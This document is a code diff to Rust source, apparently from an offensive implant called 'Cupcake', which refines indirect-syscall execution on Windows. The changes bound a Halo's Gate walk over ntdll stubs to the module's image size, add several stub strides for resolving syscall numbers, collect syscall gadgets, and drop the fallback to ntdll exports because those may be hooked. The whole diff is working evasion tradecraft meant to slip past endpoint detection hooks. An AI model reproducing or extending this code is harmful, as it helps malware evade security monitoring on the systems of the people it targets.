@@ -167,6 +167,25 @@ unsafe fn harvest_gadget_pool(state: &mut SyscallState) {
 
 /// Lazy SSN resolve: cache → clean stub → Halo's Gate neighbors.
 #[cfg(all(windows, target_arch = "x86_64"))]
+/// SizeOfImage for ntdll module (bounds Halo's Gate walk).
+#[cfg(all(windows, target_arch = "x86_64"))]
+unsafe fn ntdll_image_size(ntdll_base: usize) -> usize {
+    if ntdll_base == 0 {
+        return 0;
+    }
+    let dos = ntdll_base as *const IMAGE_DOS_HEADER;
+    if (*dos).e_magic != 0x5A4D {
+        return 0x200000; // conservative fallback ~2MB
+    }
+    let nt = (ntdll_base + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
+    let size = (*nt).OptionalHeader.SizeOfImage as usize;
+    if size == 0 {
+        0x200000
+    } else {
+        size
+    }
+}
+
 unsafe fn resolve_ssn(hash: u32) -> Option<u16> {
     {
         let state = syscall_state().lock().ok()?;
@@ -198,35 +217,43 @@ unsafe fn resolve_ssn(hash: u32) -> Option<u16> {
         return Some(ssn);
     }
 
-    // Halo's Gate: walk neighboring stubs by fixed stride
-    for i in 1..=HALO_MAX_NEIGHBORS {
-        let down = api_addr.wrapping_add(i * STUB_STRIDE);
-        if let Some((neigh_ssn, gadget)) = extract_ssn_from_stub(down) {
-            let ssn = neigh_ssn.wrapping_sub(i as u16);
-            if let Ok(mut state) = syscall_state().lock() {
-                state.ssn_cache.insert(hash, ssn);
-                remember_gadget(&mut state, gadget);
-                if state.gadgets.is_empty() {
-                    harvest_gadget_pool(&mut state);
-                }
-            }
-            return Some(ssn);
-        }
+    // Module size bound (SizeOfImage) so Halo walk never leaves ntdll
+    let ntdll_end = ntdll_base.wrapping_add(unsafe { ntdll_image_size(ntdll_base) });
 
-        let up = api_addr.wrapping_sub(i * STUB_STRIDE);
-        if up < ntdll_base {
-            break;
-        }
-        if let Some((neigh_ssn, gadget)) = extract_ssn_from_stub(up) {
-            let ssn = neigh_ssn.wrapping_add(i as u16);
-            if let Ok(mut state) = syscall_state().lock() {
-                state.ssn_cache.insert(hash, ssn);
-                remember_gadget(&mut state, gadget);
-                if state.gadgets.is_empty() {
-                    harvest_gadget_pool(&mut state);
-                }
+    // Halo's Gate: walk neighboring stubs; try fixed stride then +1 pattern scan
+    for i in 1..=HALO_MAX_NEIGHBORS {
+        for &stride in &[STUB_STRIDE, 0x10usize, 0x20usize] {
+            let down = api_addr.wrapping_add(i * stride);
+            if down >= ntdll_end {
+                break;
             }
-            return Some(ssn);
+            if let Some((neigh_ssn, gadget)) = extract_ssn_from_stub(down) {
+                let ssn = neigh_ssn.wrapping_sub(i as u16);
+                if let Ok(mut state) = syscall_state().lock() {
+                    state.ssn_cache.insert(hash, ssn);
+                    remember_gadget(&mut state, gadget);
+                    if state.gadgets.is_empty() {
+                        harvest_gadget_pool(&mut state);
+                    }
+                }
+                return Some(ssn);
+            }
+
+            let up = api_addr.wrapping_sub(i * stride);
+            if up < ntdll_base {
+                continue;
+            }
+            if let Some((neigh_ssn, gadget)) = extract_ssn_from_stub(up) {
+                let ssn = neigh_ssn.wrapping_add(i as u16);
+                if let Ok(mut state) = syscall_state().lock() {
+                    state.ssn_cache.insert(hash, ssn);
+                    remember_gadget(&mut state, gadget);
+                    if state.gadgets.is_empty() {
+                        harvest_gadget_pool(&mut state);
+                    }
+                }
+                return Some(ssn);
+            }
         }
     }
 
@@ -260,23 +287,22 @@ fn pick_gadget() -> usize {
 /// x86_64 indirect syscall execution
 #[cfg(all(windows, target_arch = "x86_64"))]
 pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
-    let mut use_fallback = false;
+    // Never fall back to hooked ntdll export stubs — fail closed.
     let ssn = match resolve_ssn(hash) {
         Some(s) => s,
         None => {
             crate::utils::db_print(&format!(
-                "[Cupcake] SSN not found for 0x{:X}, using D/Invoke fallback",
+                "[Cupcake] SSN not found for 0x{:X}, refusing hooked stub fallback",
                 hash
             ));
-            use_fallback = true;
-            0
+            return -1; // STATUS_UNSUCCESSFUL-ish
         }
     };
 
     let gadget = pick_gadget();
-    if gadget == 0 && !use_fallback {
-        crate::utils::db_print("[Cupcake] No syscall gadget, using D/Invoke fallback");
-        use_fallback = true;
+    if gadget == 0 {
+        crate::utils::db_print("[Cupcake] No syscall gadget, refusing hooked stub fallback");
+        return -1;
     }
 
     let mut a = [0usize; 11];
@@ -284,10 +310,6 @@ pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
         if i < 11 {
             a[i] = v;
         }
-    }
-
-    if use_fallback {
-        return direct_api_call(hash, &a);
     }
 
     let mut result: i32;
